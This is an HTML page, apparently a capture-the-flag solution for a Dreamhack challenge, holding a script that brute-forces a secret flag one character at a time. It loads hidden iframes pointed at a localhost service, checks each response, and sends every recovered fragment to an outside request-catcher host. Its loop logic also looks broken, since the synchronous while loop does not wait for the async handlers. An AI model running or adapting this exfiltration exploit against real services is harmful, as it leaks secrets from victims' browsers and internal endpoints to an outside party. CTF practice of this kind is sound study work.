<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag Finderx</title>
</head>
<body>
    <h1>Flag Finderx</h1>
    <script>
        let server_flag = ''; // 전역 변수

        const checkFlag = async () => {
            let found = true; // 초기 상태는 FLAG를 찾은 것으로 설정

            while (found) {
                found = false; // 다음 루프에서 FLAG를 찾지 못한 상태로 초기화

                for (let i = 32; i <= 127; i++) {
                    const flag = server_flag + String.fromCharCode(i); // 수정된 부분
                    const requestUrl = `http://localhost:60001/flag?flag=${encodeURIComponent(flag)}`;

                    // iframe을 이용하여 요청
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none'; // iframe을 보이지 않게 설정
                    iframe.src = requestUrl;
                    document.body.appendChild(iframe);

                    // 요청이 완료되면 응답을 처리하기 위해 iframe의 onload 이벤트 사용
                    iframe.onload = async () => {
                        const responseText = await fetch(requestUrl).then(res => res.text());
                        if (responseText === 'good try') {
                            server_flag += String.fromCharCode(i); // 해당 문자를 추가
                            console.log(`Current FLAG: ${server_flag}`);

                            // 최종 FLAG로 요청 보내기 (응답 기다리지 않음)
                            const finalRequestUrl = `https://xxydudf.request.dreamhack.games?flag=${encodeURIComponent(server_flag)}`;
                            fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄

                            found = true; // FLAG를 찾았으므로 true로 설정
                        }
                    };
                }
            }

            console.log('Final FLAG:', server_flag);
        };

        checkFlag();
    </script>
</body>
</html>
